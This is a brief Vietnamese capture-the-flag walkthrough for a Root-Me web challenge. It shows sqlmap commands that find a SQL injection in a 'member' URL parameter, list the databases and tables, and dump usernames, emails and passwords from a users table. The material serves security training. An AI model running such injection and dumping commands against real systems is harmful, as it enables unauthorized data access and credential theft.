![image](https://user-images.githubusercontent.com/125866921/232682056-1ad784a3-d475-43a8-ba2e-aeb37bc758dd.png)

  - Sau khi vào challenge ta đi vào phần ``member`` và chọn ``admin``.
  - Tại đây trên URL đã xuất hiện các tham số, qua đó ta có thể thực hiện SQLi.  

![image](https://user-images.githubusercontent.com/125866921/232682349-da71330c-01a4-4025-a686-150581181e18.png)

  - Sử dụng sqlmap để khai thác ở challenge này.  
  - Với ``python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 --dbs ``. Xuất hiện phần database ``public``.

![image](https://user-images.githubusercontent.com/125866921/232682615-671e7ce8-79c9-4e6d-889c-8d009eba901b.png)

  - Tiếp tục truy cập vào database ``public`` sẽ xuất hiện bảng ``users``.
  - Với ``python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 -D public --tables``.  

![image](https://user-images.githubusercontent.com/125866921/232682877-6dfb96a5-d4b9-46fb-b58f-9390bac114ef.png)

  - Ta tiếp tục xem các cột có trong bảng ``users``.  
  - Tại đây có các cột như ``password``, ``email``, ``firstname``, ``id``, ``lastname``, ``username``.  
  - Cuối cùng ta chỉ cần show các cột ấy ra là xong với ``python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=3 -D public -T users -C id,email,username,password --dump``.
